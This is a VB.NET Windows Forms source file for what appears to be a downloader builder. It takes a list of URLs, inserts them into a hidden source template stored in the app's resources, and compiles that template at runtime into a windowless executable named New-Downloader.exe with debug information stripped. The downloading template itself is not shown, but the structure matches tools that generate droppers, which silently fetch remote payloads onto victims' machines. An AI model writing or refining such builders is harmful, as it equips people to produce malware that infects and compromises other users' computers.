Imports System.CodeDom.Compiler

Public Class Form1
    Public Shared URLs As String = String.Empty
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        If RichTextBox1.Text.Length < 3 Then
            MsgBox("Please enter at least 1 URL", MsgBoxStyle.Exclamation)
        Else
            For i As Integer = 0 To RichTextBox1.Lines.Length - 1
                URLs += RichTextBox1.Lines(i) + "%SPL%"
            Next

            Dim Source = My.Resources.Source
            Source = Replace(Source, "%URL%", URLs)
            Compiler("New-Downloader.exe", Source)

        End If
    End Sub

    Public Shared Sub Compiler(ByVal Path As String, ByVal Code As String)
        Dim providerOptions = New Collections.Generic.Dictionary(Of String, String)

        providerOptions.Add("CompilerVersion", "v4.0")
        Dim CodeProvider As New Microsoft.VisualBasic.VBCodeProvider(providerOptions)
        Dim Parameters As New CompilerParameters
        With Parameters
            .GenerateExecutable = True
            .OutputAssembly = Path
            .CompilerOptions += "/target:winexe /platform:x86 /optimize+"
            .IncludeDebugInformation = False
            .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            .ReferencedAssemblies.Add("System.dll")
            .ReferencedAssemblies.Add("System.Net.dll")
            .ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")

            Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code)
            If Results.Errors.Count > 0 Then
                For Each E In Results.Errors
                    MsgBox(E.ErrorText)
                Next
            Else
                MsgBox("Done! [New-Downloader.exe]", MsgBoxStyle.Information)
            End If
        End With

    End Sub

End Class
